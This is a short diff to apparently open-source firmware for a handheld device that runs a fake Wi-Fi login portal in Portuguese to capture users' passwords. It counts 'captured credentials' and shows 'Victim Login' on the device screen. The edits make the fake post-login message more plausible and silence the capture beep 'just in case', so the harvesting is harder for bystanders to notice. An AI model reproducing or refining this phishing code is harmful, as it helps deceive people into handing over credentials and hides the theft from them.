@@ -25,7 +25,7 @@
 #define LOGIN_PASSWORD_PLACEHOLDER "Senha"
 #define LOGIN_MESSAGE "Por favor, faça login para navegar de forma segura."
 #define LOGIN_BUTTON "Avançar"
-#define LOGIN_AFTER_MESSAGE "Por favor, aguarde alguns minutos. Em breve você poderá acessar a internet."
+#define LOGIN_AFTER_MESSAGE "Fazendo login..."
 #endif
 
 int totalCapturedCredentials = 0;
@@ -227,7 +227,7 @@ void setupWebServer() {
     delay(50);
     SPEAKER.mute();
 #elif defined(CARDPUTER)
-    SPEAKER.tone(4000, 50);
+    //SPEAKER.tone(4000, 50);     //Silent mode, just in case
 #endif
     DISP.print("Victim Login");
 #if defined(M5LED)
